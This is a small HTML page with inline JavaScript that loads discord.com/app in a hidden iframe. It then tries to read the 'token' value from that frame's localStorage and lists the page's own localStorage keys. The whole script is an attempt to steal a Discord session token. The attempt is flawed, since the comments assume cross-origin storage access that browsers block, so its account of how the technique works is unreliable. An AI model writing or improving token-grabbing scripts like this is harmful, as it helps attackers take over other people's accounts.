<!DOCTYPE html>
<html>
<body>
    <script>
        // Check if we're on the right origin
        document.write('Current origin: ' + window.location.origin + '<br><br>');
        
        // Try to access Discord's localStorage directly
        try {
            // Open Discord in an iframe to access its storage
            let iframe = document.createElement('iframe');
            iframe.src = 'https://discord.com/app';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            setTimeout(function() {
                try {
                    let discordStorage = iframe.contentWindow.localStorage;
                    let token = discordStorage.getItem('token');
                    document.write('Token from iframe: ' + (token || 'null') + '<br>');
                } catch(e) {
                    document.write('Iframe error: ' + e.message + '<br>');
                }
            }, 3000);
        } catch(e) {
            document.write('Error: ' + e.message + '<br>');
        }
        
        // List all localStorage keys
        document.write('<br>localStorage keys on this page:<br>');
        for (let i = 0; i < localStorage.length; i++) {
            document.write(localStorage.key(i) + '<br>');
        }
    </script>
</body>
</html>
